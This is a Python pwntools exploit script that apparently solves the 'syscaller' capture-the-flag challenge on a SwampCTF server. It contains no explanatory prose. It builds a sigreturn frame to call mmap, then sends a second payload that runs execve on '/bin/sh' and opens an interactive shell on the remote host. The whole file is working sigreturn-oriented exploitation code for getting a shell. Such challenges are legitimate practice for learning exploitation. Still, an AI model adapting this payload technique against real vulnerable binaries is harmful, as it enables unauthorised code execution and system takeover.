from pwn import *
import time

def main():
	#p = process("./syscaller")
	p = remote("chal1.swampctf.com", 1800)
	context.arch = 'amd64'
	#gdb.attach(p, "break _start")
	
	p.recvuntil("perish.")
	payload = ""
	
	#create mmap
	payload += p64(0x41414141) * 3
	payload += p64(0xf) #rax	
	payload += p64(0x0) * 4
	#https://www.safaribooksonline.com/library/view/linux-system-programming/0596009585/ch04s03.html
	frame = SigreturnFrame(kernel='amd64')
	frame.rax = 0x9
	frame.rdi = 0x402000
	frame.rsi = 0x200 #512 should be enough
	frame.rdx = 0x7 # PROT_WRITE
	frame.r10 = 0x22 # MAP_FIXED
	frame.r8 = -1 #fd
	frame.r9 = 0 #offset
	frame.rsp = 0x402000
	frame.rip = 0x400104 #another syscall (reads)
	
	payload += str(frame)
	p.send(payload)
	
	p.recvline()
	bin_sh = 0x402000 + (8*8)
	payload2 = ""
	payload2 += p64(0x43434343) * 2 # r12 & r11, junk
	payload2 += p64(bin_sh) #rdi
	payload2 += p64(59) #execve
	payload2 += p64(0x0) #rbx, junk
	payload2 += p64(0x0) * 2 #rdx & rsi, null
	payload2 += p64(bin_sh) #rdi again, lol
	payload2 += p64(u64("/bin/sh\x00"))
	
	p.send(payload2)	
	p.interactive()

if __name__ == "__main__":
	main()
